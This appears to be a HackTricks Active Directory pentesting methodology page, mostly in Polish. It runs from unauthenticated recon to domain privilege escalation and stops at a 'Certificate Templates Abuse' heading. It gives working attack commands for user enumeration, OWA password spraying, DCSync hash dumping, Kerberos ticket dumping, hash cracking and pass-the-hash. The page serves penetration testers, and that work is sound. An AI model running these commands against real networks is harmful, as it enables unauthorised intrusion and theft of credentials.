# Metodologia Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Podstawowy przegląd

**Active Directory** pełni rolę technologii bazowej, umożliwiając **administratorom sieciowym** efektywne tworzenie i zarządzanie **domains**, **users** oraz **objects** w sieci. Została zaprojektowana z myślą o skalowalności, pozwalając na organizację dużej liczby użytkowników w zarządzalne **groups** i **subgroups**, jednocześnie kontrolując **access rights** na różnych poziomach.

Struktura **Active Directory** składa się z trzech głównych warstw: **domains**, **trees** i **forests**. **Domain** obejmuje zbiór obiektów, takich jak **users** czy **devices**, korzystających ze wspólnej bazy danych. **Trees** to grupy domen powiązane wspólną strukturą, a **forest** reprezentuje zbiór wielu trees połączonych poprzez **trust relationships**, tworząc najwyższy poziom struktury organizacyjnej. Na każdym z tych poziomów można przypisywać konkretne prawa **access** i komunikacji.

Kluczowe pojęcia w ramach **Active Directory** obejmują:

1. **Directory** – Zawiera wszystkie informacje dotyczące obiektów Active Directory.
2. **Object** – Oznacza byty w katalogu, w tym **users**, **groups** lub **shared folders**.
3. **Domain** – Służy jako kontener dla obiektów katalogu; w ramach **forest** może istnieć wiele domen, z których każda ma własny zbiór obiektów.
4. **Tree** – Grupa domen dzielących wspólną domenę root.
5. **Forest** – Najwyższy poziom struktury organizacyjnej w Active Directory, składający się z kilku trees powiązanych przez **trust relationships**.

**Active Directory Domain Services (AD DS)** obejmuje zestaw usług istotnych dla scentralizowanego zarządzania i komunikacji w sieci. Te usługi to:

1. **Domain Services** – Centralizuje przechowywanie danych i zarządza interakcjami pomiędzy **users** a **domains**, w tym **authentication** i funkcje **search**.
2. **Certificate Services** – Zarządza tworzeniem, dystrybucją i obsługą bezpiecznych **digital certificates**.
3. **Lightweight Directory Services** – Wspiera aplikacje wykorzystujące katalog poprzez protokół **LDAP**.
4. **Directory Federation Services** – Umożliwia **single-sign-on** do uwierzytelniania użytkowników w wielu aplikacjach webowych w jednej sesji.
5. **Rights Management** – Pomaga chronić materiały objęte prawami autorskimi, ograniczając ich nieautoryzowane rozpowszechnianie i użycie.
6. **DNS Service** – Kluczowa dla rozwiązywania nazw **domain names**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Skrócona ściągawka

You can take a lot to [https://wadcoms.github.io/](https://wadcoms.github.io) to have a quick view of which commands you can run to enumerate/exploit an AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Rekonesans Active Directory (bez poświadczeń/sesji)

If you just have access to an AD environment but you don't have any credentials/sessions you could:

- **Pentest the network:**
- Skanuj sieć, znajdź maszyny i otwarte porty oraz spróbuj **exploit vulnerabilities** lub **extract credentials** z nich (na przykład [printers could be very interesting targets](ad-information-in-printers.md)).
- Enumeracja DNS może dostarczyć informacji o kluczowych serwerach w domenie, takich jak web, printers, shares, vpn, media itp.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Sprawdź ogólną [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md), aby znaleźć więcej informacji jak to zrobić.
- **Check for null and Guest access on smb services** (to nie zadziała w nowoczesnych wersjach Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Bardziej szczegółowy przewodnik po enumeracji serwera SMB można znaleźć tutaj:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Bardziej szczegółowy przewodnik po enumeracji LDAP można znaleźć tutaj (zwróć **szczególną uwagę na anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Zbieraj poświadczenia, **impersonating services with Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Uzyskaj dostęp do hosta poprzez [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Zbieraj poświadczenia **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Wyciągaj nazwy użytkowników/imiona z dokumentów wewnętrznych, mediów społecznościowych, usług (głównie web) wewnątrz środowisk domeny, jak również z publicznie dostępnych źródeł.
- Jeśli znajdziesz pełne imiona i nazwiska pracowników firmy, możesz spróbować różnych konwencji tworzenia nazw użytkowników w AD (**read this**). Najczęstsze konwencje to: _NameSurname_, _Name.Surname_, _NamSur_ (3 litery z każdego), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Narzędzia:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeracja użytkowników

- **Anonymous SMB/LDAP enum:** Sprawdź strony [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) i [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Gdy zostanie podany **nieprawidłowy username**, serwer odpowie kodem błędu Kerberos _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, co pozwala nam stwierdzić, że nazwa użytkownika jest nieprawidłowa. **Prawidłowe nazwy użytkowników** wywołają albo **TGT w AS-REP**, albo błąd _KRB5KDC_ERR_PREAUTH_REQUIRED_, wskazujący, że użytkownik musi wykonać pre-authentication.
- **No Authentication against MS-NRPC**: Użycie auth-level = 1 (No authentication) przeciwko interfejsowi MS-NRPC (Netlogon) na domain controllerach. Metoda wywołuje funkcję `DsrGetDcNameEx2` po związywaniu się z interfejsem MS-NRPC, aby sprawdzić czy użytkownik lub komputer istnieje bez żadnych poświadczeń. Narzędzie [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementuje ten typ enumeracji. Badania można znaleźć [tutaj](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Jeśli znajdziesz jeden z tych serwerów w sieci, możesz również przeprowadzić **user enumeration against it**. Na przykład możesz użyć narzędzia [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Jednak powinieneś mieć **imiona i nazwiska osób pracujących w firmie** z etapu recon, który powinieneś wykonać wcześniej. Mając imię i nazwisko możesz użyć skryptu [**namemash.py**](https://gist.github.com/superkojiman/11076951) do wygenerowania potencjalnych prawidłowych nazw użytkowników.

### Znając jedno lub kilka nazw użytkowników

Ok, więc wiesz, że masz już poprawną nazwę użytkownika, ale nie masz haseł... Spróbuj wtedy:

- [**ASREPRoast**](asreproast.md): If a user **doesn't have** the attribute _DONT_REQ_PREAUTH_ you can **request a AS_REP message** for that user that will contain some data encrypted by a derivation of the password of the user.
- [**Password Spraying**](password-spraying.md): Spróbuj najbardziej **popularnych haseł** dla każdego z odnalezionych użytkowników — może ktoś używa słabego hasła (pamiętaj o password policy!).
- Zauważ, że możesz też **spray OWA servers** aby spróbować uzyskać dostęp do serwerów poczty użytkowników.

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Możesz być w stanie uzyskać niektóre challenge'owe **hashes**, które można złamać, przeprowadzając **poisoning** niektórych protokołów w sieci:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  to get access to the AD env.

### NetExec workspace-driven recon & relay posture checks

- Użyj **`nxcdb` workspaces** aby przechowywać stan rekonesansu AD dla danego engagementu: `workspace create <name>` tworzy per-protocol bazy SQLite w `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Przełączaj widoki poleceniem `proto smb|mssql|winrm` i wyświetl zebrane poświadczenia poleceniem `creds`. Ręcznie usuń wrażliwe dane po zakończeniu: `rm -rf ~/.nxc/workspaces/<name>`.
- Szybkie wykrywanie podsieci za pomocą **`netexec smb <cidr>`** ujawnia **domain**, **OS build**, **SMB signing requirements** oraz **Null Auth**. Węzły pokazujące `(signing:False)` są **relay-prone**, podczas gdy DC często wymagają podpisywania.
- Generuj **hostnames in /etc/hosts** bezpośrednio z wyników NetExec, aby ułatwić targetowanie:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Gdy **SMB relay to the DC is blocked** przez podpisywanie, nadal sprawdź ustawienia **LDAP**: `netexec ldap <dc>` pokaże `(signing:None)` / słabe channel binding. DC z wymaganym SMB signing, ale wyłączonym LDAP signing pozostaje realnym celem **relay-to-LDAP** do nadużyć takich jak **SPN-less RBCD**.

### Po stronie klienta printer credential leaks → masowa walidacja poświadczeń domeny

- Interfejsy webowe drukarek czasami **osadzają zamaskowane hasła administratora w HTML**. Podgląd źródła / devtools może ujawnić tekst jawny (np. `<input value="<password>">`), umożliwiając dostęp przez Basic-auth do repozytoriów skanów/druków.
- Pobrane zadania drukowania mogą zawierać **dokumenty onboardingowe w formie tekstu jawnego** z hasłami przypisanymi do poszczególnych użytkowników. Przy testowaniu zachowaj zgodność par:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Jeśli możesz uzyskać dostęp do innych komputerów lub udziałów sieciowych przy użyciu **null or guest user**, możesz **umieścić pliki** (np. SCF file), które jeśli zostaną w jakiś sposób otwarte, spowodują **NTLM authentication przeciwko Tobie**, dzięki czemu możesz **ukraść** **NTLM challenge** i spróbować go złamać:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** traktuje każdy NT hash, który już posiadasz, jak kandydat na hasło dla innych, wolniejszych formatów, których materiał klucza jest wyprowadzany bezpośrednio z NT hash. Zamiast brute-forcować długie frazy w Kerberos RC4 tickets, NetNTLM challenges czy cached credentials, podajesz NT hashe do Hashcat’s NT-candidate modes i pozwalasz mu zweryfikować ponowne użycie haseł bez poznania tekstu jawnego. To jest szczególnie skuteczne po kompromitacji domeny, gdy możesz zebrać tysiące aktualnych i historycznych NT hashy.

Użyj shuckingu gdy:

- Masz korpus NT z DCSync, SAM/SECURITY dumps lub credential vaults i musisz sprawdzić ponowne użycie w innych domenach/lasach.
- Przechwycisz materiał Kerberos oparty na RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), odpowiedzi NetNTLM, lub bloby DCC/DCC2.
- Chcesz szybko udowodnić ponowne użycie dla długich, niełamalnych fraz i natychmiast przemieścić się przez Pass-the-Hash.

Technika **nie działa** przeciwko typom szyfrowania, których klucze nie są NT hashem (np. Kerberos etype 17/18 AES). Jeśli domena wymusza tylko AES, musisz wrócić do zwykłych trybów hasła.

#### Building an NT hash corpus

- **DCSync/NTDS** – Użyj `secretsdump.py` z historią, aby zebrać jak największy zestaw NT hashy (i ich poprzednich wartości):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Wpisy historii znacząco poszerzają pulę kandydatów, ponieważ Microsoft może przechowywać do 24 poprzednich hashy na konto. Po więcej metod zbierania sekretów NTDS zobacz:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (lub Mimikatz `lsadump::sam /patch`) wyciąga lokalne SAM/SECURITY oraz cached domain logons (DCC/DCC2). Usuń duplikaty i dołącz te hashe do tego samego pliku `nt_candidates.txt`.
- **Track metadata** – Zachowuj nazwę użytkownika/domeny, z której pochodzi każdy hash (nawet jeśli wordlist zawiera tylko hex). Dopasowanie hashy od razu wskaże, który principal ponownie używa hasła, gdy Hashcat wypisze zwycięskiego kandydata.
- Preferuj kandydatów z tego samego lasu lub z zaufanego lasu; to maksymalizuje szansę na pokrycie przy shuckingu.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Uwagi:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Wyłącz silniki reguł (bez `-r`, bez trybów hybrydowych), ponieważ modyfikacje uszkadzają materiał klucza kandydata.
- Te tryby nie są z natury szybsze, ale przestrzeń kluczy NTLM (~30,000 MH/s na M3 Max) jest ~100× szybsza niż Kerberos RC4 (~300 MH/s). Testowanie wykuratorowanej listy NT jest znacznie tańsze niż przeszukiwanie całej przestrzeni haseł w wolnym formacie.
- Zawsze uruchamiaj **najnowszy build Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) ponieważ tryby 31500/31600/35300/35400 zostały dodane niedawno.
- Obecnie nie ma trybu NT dla AS-REQ Pre-Auth, a etypy AES (19600/19700) wymagają hasła w postaci jawnej, ponieważ ich klucze są wyprowadzane przez PBKDF2 z UTF-16LE haseł, a nie z surowych NT hashy.

#### Example – Kerberoast RC4 (mode 35300)

1. Przechwyć RC4 TGS dla docelowego SPN przy użyciu użytkownika o niskich uprawnieniach (szczegóły na stronie Kerberoast):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuckuj ticket używając swojej listy NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat wyprowadza klucz RC4 z każdego NT kandydata i weryfikuje blob `$krb5tgs$23$...`. Dopasowanie potwierdza, że konto usługi używa jednego z posiadanych przez Ciebie NT hashy.

3. Natychmiast przemieść się przez PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Opcjonalnie możesz później odzyskać plaintext używając `hashcat -m 1000 <matched_hash> wordlists/`, jeśli zajdzie taka potrzeba.

#### Example – Cached credentials (mode 31600)

1. Zrzutuj cached logons z skompromitowanej stacji roboczej:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Skopiuj linię DCC2 dla interesującego użytkownika domenowego do `dcc2_highpriv.txt` i shuckuj ją:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Udane dopasowanie daje NT hash już znany z Twojej listy, co dowodzi, że użytkownik w cache ponownie używa hasła. Użyj go bezpośrednio do PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) lub brute-force w szybkim trybie NTLM, aby odzyskać ciąg.

Dokładnie ten sam workflow dotyczy NetNTLM challenge-response (`-m 27000/27100`) i DCC (`-m 31500`). Po zidentyfikowaniu dopasowania możesz uruchomić relay, SMB/WMI/WinRM PtH, lub ponownie złamać NT hash offline używając masek/reguł.

## Enumerating Active Directory WITH credentials/session

W tej fazie musisz mieć **skompromitowane poświadczenia lub sesję** ważnego konta domenowego. Jeśli masz jakieś ważne poświadczenia lub shell jako użytkownik domenowy, **pamiętaj, że opcje podane wcześniej wciąż są opcjami do kompromitacji innych użytkowników**.

Przed rozpoczęciem uwierzytelnionej enumeracji powinieneś znać **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Skompromitowanie konta to **duży krok do rozpoczęcia kompromitacji całej domeny**, ponieważ będziesz mógł rozpocząć **Active Directory Enumeration:**

W odniesieniu do [**ASREPRoast**](asreproast.md) możesz teraz znaleźć wszystkich możliwych podatnych użytkowników, a w odniesieniu do [**Password Spraying**](password-spraying.md) możesz uzyskać **listę wszystkich nazw użytkowników** i spróbować hasła skompromitowanego konta, pustych haseł oraz nowych obiecujących haseł.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) ponieważ mogą zawierać interesujące informacje.
- Narzędzie z GUI, którego możesz użyć do enumeracji katalogu to **AdExplorer.exe** z zestawu **SysInternal**.
- Możesz również przeszukać bazę LDAP za pomocą **ldapsearch**, aby znaleźć poświadczenia w polach _userPassword_ & _unixUserPassword_, lub nawet w _Description_. por. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) dla innych metod.
- Jeśli używasz **Linux**, możesz również enumerować domenę za pomocą [**pywerview**](https://github.com/the-useless-one/pywerview).
- Możesz też spróbować narzędzi zautomatyzowanych takich jak:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Bardzo łatwo jest uzyskać wszystkie nazwy użytkowników domeny z Windows (`net user /domain` ,`Get-DomainUser` lub `wmic useraccount get name,sid`). W Linuxie możesz użyć: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` lub `enum4linux -a -u "user" -p "password" <DC IP>`

> Nawet jeśli sekcja Enumeracja wygląda krótko, to jest to najważniejsza część całości. Odwiedź podane linki (głównie te dotyczące cmd, powershell, powerview i BloodHound), naucz się jak enumerować domenę i ćwicz, aż poczujesz się pewnie. Podczas testu będzie to kluczowy moment, aby znaleźć drogę do DA lub zdecydować, że nic się nie da zrobić.

### Kerberoast

Kerberoasting polega na uzyskaniu **TGS tickets** używanych przez usługi powiązane z kontami użytkowników i złamaniu ich szyfrowania — które jest oparte na hasłach użytkowników — **offline**.

Więcej na ten temat:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Gdy zdobędziesz poświadczenia, możesz sprawdzić, czy masz dostęp do jakiejkolwiek **maszyny**. W tym celu możesz użyć **CrackMapExec**, aby spróbować połączyć się z wieloma serwerami przy użyciu różnych protokołów, zgodnie z wynikami skanów portów.

### Local Privilege Escalation

Jeżeli posiadasz skompromitowane poświadczenia lub sesję jako zwykły użytkownik domenowy i masz **dostęp** tym użytkownikiem do **jakiejkolwiek maszyny w domenie**, powinieneś spróbować znaleźć sposób na **lokalną eskalację uprawnień i pozyskanie poświadczeń**. Tylko mając uprawnienia lokalnego administratora będziesz w stanie **zrzucać hashe innych użytkowników** z pamięci (LSASS) i lokalnie (SAM).

W tej książce jest oddzielna strona o [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) oraz [**checklist**](../checklist-windows-privilege-escalation.md). Nie zapomnij też użyć [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Jest **mało prawdopodobne**, że znajdziesz **tickets** w bieżącym koncie użytkownika dające Ci pozwolenie na dostęp do nieoczekiwanych zasobów, ale możesz to sprawdzić:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the active directory you will have **więcej adresów e-mail i lepsze zrozumienie sieci**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Szukaj Creds w udostępnieniach komputerów | SMB Shares

Now that you have some basic credentials you should check if you can **znaleźć** any **interesujące pliki udostępniane w AD**. You could do that manually but it's a very boring repetitive task (and more if you find hundreds of docs you need to check).

[**Kliknij ten link, aby dowiedzieć się o narzędziach, których możesz użyć.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Kradzież NTLM Creds

If you can **uzyskać dostęp do innych PCs lub udziałów** you could **umieścić pliki** (like a SCF file) that if somehow accessed will **wywołać uwierzytelnienie NTLM do ciebie** so you can **ukraść** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

This vulnerability allowed any authenticated user to **przejąć kontrolę nad kontrolerem domeny**.


{{#ref}}
printnightmare.md
{{#endref}}

## Eskalacja uprawnień w Active Directory Z uprzywilejowanymi poświadczeniami/sesją

**Do poniższych technik zwykły użytkownik domeny nie wystarczy, potrzebujesz specjalnych uprawnień/poświadczeń, aby je wykonać.**

### Ekstrakcja hashy

Miejmy nadzieję, że udało ci się **przejąć jakieś konto lokalnego administratora** używając [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Then, its time to dump all the hashes in memory and locally.\
[**Przeczytaj tę stronę o różnych sposobach pozyskania hashy.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Gdy masz hash użytkownika**, możesz go użyć, aby się **podszyć**.\
You need to use some **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.\
[**Przeczytaj tę stronę po więcej informacji.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **przydatny w sieciach, gdzie protokół NTLM jest wyłączony** i tylko **Kerberos jest dozwolony** jako protokół uwierzytelniania.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

W metodzie ataku **Pass The Ticket (PTT)** atakujący **kradnie ticket uwierzytelniający użytkownika** zamiast jego hasła lub wartości hash. Ten skradziony ticket jest następnie używany do **podszycia się pod użytkownika**, uzyskując nieautoryzowany dostęp do zasobów i usług w sieci.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Ponowne użycie poświadczeń

If you have the **hash** or **password** of a **local administrato**r you should try to **login locally** to other **PCs** with it.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Zauważ, że to jest dość **głośne** i **LAPS** by to **złagodził**.

### MSSQL Abuse & Trusted Links

Jeśli użytkownik ma uprawnienia do **dostępu do instancji MSSQL**, może użyć ich do **wykonywania poleceń** na hoście MSSQL (jeśli działa jako SA), **wykradzenia** NetNTLM **hash** lub nawet przeprowadzenia **relay attack**.\
Również, jeśli instancja MSSQL jest zaufana (database link) przez inną instancję MSSQL. Jeśli użytkownik ma uprawnienia w zaufanej bazie, będzie mógł **wykorzystać relację zaufania do wykonywania zapytań także w drugiej instancji**. Te zaufania można łączyć w łańcuchy i w pewnym momencie użytkownik może znaleźć źle skonfigurowaną bazę, gdzie będzie mógł wykonać polecenia.\
**Połączenia między bazami działają nawet przez forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Zewnętrzne narzędzia do inwentaryzacji i deploymentu często ujawniają potężne ścieżki do poświadczeń i wykonania kodu. Zobacz:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Jeśli znajdziesz jakikolwiek obiekt Computer z atrybutem [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i masz uprawnienia domenowe na tym komputerze, będziesz w stanie zrzucić TGTy z pamięci wszystkich użytkowników logujących się na tym komputerze.\  
Więc, jeśli **Domain Admin** zaloguje się na tym komputerze, będziesz mógł zrzucić jego TGT i podszyć się pod niego używając [Pass the Ticket](pass-the-ticket.md).\  
Dzięki constrained delegation możesz nawet **automatycznie przejąć Print Server** (oby był to DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Jeśli użytkownik lub komputer ma włączoną "Constrained Delegation", będzie mógł **podszyć się pod dowolnego użytkownika, by uzyskać dostęp do niektórych usług na komputerze**.\  
Następnie, jeśli **skompromitujesz hash** tego użytkownika/komputera będziesz w stanie **podszyć się pod dowolnego użytkownika** (nawet Domain Admins) aby uzyskać dostęp do usług.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Having **WRITE** privilege on an Active Directory object of a remote computer enables the attainment of code execution with **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Skompromitowany użytkownik może mieć pewne **interesujące uprawnienia do obiektów domeny**, które mogłyby pozwolić Ci **move laterally**/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Odkrycie aktywnego **Spool service** w domenie może być **wykorzystane** do **pozyskania nowych poświadczeń** i **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Jeśli **inni użytkownicy** **uzyskują dostęp** do **skompro-mitowanego** komputera, możliwe jest **zbieranie poświadczeń z pamięci** i nawet **wstrzykiwanie beacons** do ich procesów, by się za nich podszyć.\
Zazwyczaj użytkownicy łączą się przez RDP, więc tutaj masz jak wykonać parę ataków na sesje RDP osób trzecich:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** zapewnia system zarządzania hasłem lokalnego Administratora na komputerach dołączonych do domeny, zapewniając, że jest ono **losowe**, unikalne i często **zmieniane**. Te hasła są przechowywane w Active Directory, a dostęp jest kontrolowany przez ACLs tylko dla uprawnionych użytkowników. Mając wystarczające uprawnienia do odczytu tych haseł, możliwe jest pivotowanie do innych komputerów.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Zbieranie certyfikatów** z skompromitowanej maszyny może być sposobem na eskalację uprawnień w środowisku:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

